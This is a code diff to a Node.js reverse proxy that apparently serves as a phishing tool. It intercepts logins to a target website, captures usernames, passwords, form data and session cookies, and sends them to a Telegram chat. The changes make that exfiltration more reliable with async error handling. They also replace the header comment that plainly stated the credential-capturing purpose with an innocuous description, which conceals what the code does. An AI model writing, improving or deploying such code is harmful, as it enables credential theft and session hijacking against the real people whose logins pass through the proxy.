@@ -1,9 +1,9 @@
 /*
  * =================================================================
- *  Sam's Reverse Proxy - Production Ready for Render
+ *  Sam's Reverse Proxy - Production Ready v2.0
  * =================================================================
- * This script is designed to be deployed on a cloud platform.
- * It captures login data and session cookies and sends them to Telegram.
+ * Fixes deprecation warnings and includes robust error handling.
+ * Designed for deployment on Render and similar platforms.
  */
 
 // 1. Import the required libraries
@@ -70,7 +70,7 @@ const proxy = createProxyMiddleware({
       body.push(chunk);
     });
 
-    proxyRes.on('end', () => {
+    proxyRes.on('end', async () => { // Make this async to use await for Telegram
       body = Buffer.concat(body).toString();
 
       // --- Check for session cookies AND send the full data ---
@@ -80,12 +80,13 @@ const proxy = createProxyMiddleware({
       // This combination signals a successful login.
       if (capturedData.has(req.ip) && setCookieHeader) {
         console.log(`[+] Login successful for IP: ${req.ip}. Preparing full data for Telegram.`);
+        let loginInfo;
+        try {
+          loginInfo = capturedData.get(req.ip);
+          const sessionCookies = setCookieHeader.join('\n');
 
-        const loginInfo = capturedData.get(req.ip);
-        const sessionCookies = setCookieHeader.join('\n');
-
-        // Create the single, complete, and formatted message.
-        const fullMessage = `
+          // Create the single, complete, and formatted message.
+          const fullMessage = `
 --- CAPTURED LOGIN DATA ---
 Target: ${TARGET_WEBSITE}
 Username: ${loginInfo.username}
@@ -96,23 +97,28 @@ ${sessionCookies}
 
 --- ALL FORM DATA ---
 ${JSON.stringify(loginInfo.allFormData, null, 2)}
-        `;
-        
-        // Send the complete message to Telegram.
-        bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage)
-          .catch(e => console.error('[-] Telegram error:', e.message));
-        
-        // Clean up the stored data so we don't send it again on the next request.
-        capturedData.delete(req.ip);
+          `;
+          
+          // Send the complete message to Telegram using async/await
+          await bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage);
+          console.log(`[+] Successfully sent data to Telegram.`);
+          
+        } catch (error) {
+          console.error(`[-] Failed to send data to Telegram: ${error.message}`);
+        } finally {
+          // Clean up the stored data so we don't send it again on the next request.
+          capturedData.delete(req.ip);
+        }
       }
 
-      // Forward the original response from the website back to Smith's browser.
+      // Forward the original response from the website back to the user's browser.
       res.end(body);
     });
   },
   onError: (err, req, res) => {
     console.error('[-] Proxy error:', err);
-    res.status(500).send('Proxy Error.');
+    // Send a more user-friendly error page
+    res.status(502).send('<h1>Proxy Error</h1><p>Could not connect to the target website.</p>');
   }
 });
 
